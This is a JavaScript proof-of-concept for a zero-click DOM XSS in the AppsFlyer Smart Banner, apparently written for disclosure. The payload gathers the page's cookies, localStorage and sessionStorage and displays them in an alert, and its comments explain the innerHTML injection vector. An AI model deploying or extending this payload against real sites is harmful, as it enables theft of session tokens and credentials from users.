// AppsFlyer Smart Banner XSS PoC — s1n6h
// Zero-click: fires on page load via <svg onload> in creative layout
// The creative layout is injected via innerHTML (no sanitization)
// <svg onload> fires automatically when parsed into the DOM
// This is a DOM XSS - no user interaction required

(async () => {
  const data = {
    origin: window.location.origin,
    cookies: document.cookie || '(none)',
    localStorage: Object.keys(localStorage).length ? 
      JSON.stringify(Object.fromEntries(Object.entries(localStorage))).substring(0, 500) : '(empty)',
    sessionStorage: Object.keys(sessionStorage).length ? 
      JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))).substring(0, 500) : '(empty)',
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };
  
  alert(
    'XSS confirmed on: ' + data.origin + '\n\n' +
    'Cookies: ' + data.cookies + '\n\n' +
    'LocalStorage: ' + data.localStorage + '\n\n' +
    'This is a ZERO-CLICK DOM XSS — fired on page load via innerHTML injection.\n' +
    'In a real attack, this would steal wallet funds, session tokens, or credentials.'
  );
})();
